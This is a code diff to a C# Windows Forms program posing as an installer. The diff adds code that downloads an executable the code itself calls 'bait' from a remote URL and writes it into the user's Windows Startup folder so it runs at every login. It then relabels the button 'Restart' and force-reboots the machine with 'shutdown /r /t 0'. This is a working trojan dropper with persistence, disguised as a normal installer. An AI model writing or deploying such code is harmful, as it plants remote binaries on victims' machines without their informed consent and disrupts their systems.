@@ -1,24 +1,37 @@
 using System.Diagnostics.CodeAnalysis;
-
+using System.Diagnostics;
 
 namespace Installer
 {
     public partial class Window : Form
     {
-        private static String DOWNLOAD_BAIT_URL = "https://utfs.io/f/643d55c9-860e-4d05-9bdf-015064f8272b-fjupde.exe";
+        private static String DOWNLOAD_BAIT_URL = "https://github.com/Txreq/gaben/releases/download/1.0.0/gaben.exe";
         private byte[]? data;
+        private bool isBaitDownloaded = false;
 
         public Window()
         {
             InitializeComponent();
         }
 
-        private async void InstallButton_Click(object sender, EventArgs e)
+        private void InstallButton_Click(object sender, EventArgs e)
+        {
+            if (!isBaitDownloaded)
+            {
+                SetupBait();
+            }
+            else
+            {
+                RestartSystem();
+            }
+        }
+
+        private async void SetupBait()
         {
             ResponseLabel.Text = string.Empty;
             InstallButton.Enabled = false;
             InstallButton.Text = "Installing...";
-            String StartupAppsPath = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+            String Path = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\gaben.exe";
 
             if (data is null)
                 await DownloadData();
@@ -31,9 +44,12 @@ namespace Installer
             }
 
 
-            File.WriteAllBytes(StartupAppsPath, data);
+            File.WriteAllBytes(Path, data);
+            isBaitDownloaded = true;
+            InstallButton.Enabled = true;
+            InstallButton.Text = "Restart";
+            Paragraph.Text = "A system restart may be required.";
 
-            InstallButton.Text = "Installed";
         }
 
         [MemberNotNullWhen(true, nameof(data))]
@@ -52,6 +68,11 @@ namespace Installer
             data = await response.Content.ReadAsByteArrayAsync();
 
             return true;
+        }
+
+        static private void RestartSystem()
+        {
+            Process.Start("shutdown", "/r /t 0");
         }
     }
 }
